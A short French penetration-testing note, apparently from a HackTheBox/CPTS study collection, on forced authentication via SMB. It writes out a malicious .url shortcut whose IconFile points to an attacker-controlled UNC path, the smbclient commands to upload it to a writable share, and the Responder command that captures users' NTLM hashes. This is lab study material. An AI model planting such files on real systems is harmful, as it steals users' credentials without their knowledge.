Exploit le smb shorcut url

Sur le SMB de la machine cible, il faut avoir les droits en ecriture sur le dossier exploitable. 
![alt text](https://github.com/milouzevich/CPTS/blob/main/HTB/Technique/SMB/Pasted%20image%2020260804152513.png)
Lorsque les utilisateurs viendront se connecter le fichier sera téléchargé et le hash du user sera capté par responder. 

```
nano pwn.url

[InternetShortcut] 
URL=asdasdas 
WorkingDirectory=hehe 
IconFile=\\10.10.17.68\aasd\nc.ico 
IconIndex=1
```

- Enregistrer le fichier en pwn.url 
- Mettre le fichier a la racine de nos droits dans le smb avec la commande put 

```bash 
smbclient -U guest //10.129.44.190/share

smb: \> cd transfer\
smb: \transfer\> ls 
  .                                   D        0  Mon Sep  8 06:13:44 2025
  ..                                  D        0  Tue Aug  4 09:24:55 2026
  claire.pope                         D        0  Thu Feb 17 06:21:35 2022
  diana.pope                          D        0  Thu Feb 17 06:21:19 2022
  julia.wong  
smb > put pwn.url 
```


Sur la machine ATTACK 
```bash 
sudo responder -I tun0 -A
```

![alt text](https://github.com/milouzevich/CPTS/blob/main/HTB/Technique/SMB/Pasted%20image%2020260804154219.png)
